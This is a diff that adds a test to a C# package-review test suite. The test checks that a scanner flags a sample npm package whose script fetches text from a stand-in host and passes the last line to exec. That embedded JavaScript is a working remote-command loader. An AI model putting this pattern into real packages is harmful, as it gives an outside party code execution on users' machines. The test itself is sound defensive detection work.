@@ -2192,6 +2192,17 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_response_split_into_lines_whose_last_line_reaches_a_helper_that_runs_it_is_noteworthy()
+    {
+        var r = Review(Tgz("poll-1.0.0.tgz",
+            ("package/package.json", """{"name":"poll-lines","version":"1.0.0","main":"lib/poll.js"}"""),
+            ("package/lib/poll.js", "const https = require('https');\nconst { exec } = require('child_process');\nfunction run(c) { exec(c); }\n" +
+                "https.get('https://example.invalid/commands', res => {\n  let data = '';\n  res.on('data', chunk => { data += chunk; });\n" +
+                "  res.on('end', () => {\n    const lines = data.split('\\n').map(s => s.trim()).filter(Boolean);\n    const cmd = lines[lines.length - 1];\n    run(cmd);\n  });\n});")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/response-command", Level: "noteworthy" });
+    }
+
+    [Fact]
     public void A_socket_or_fetched_command_is_run_and_process_output_or_a_regexp_exec_is_not()
     {
         const string Rule = "runs a command read from a network response or socket";
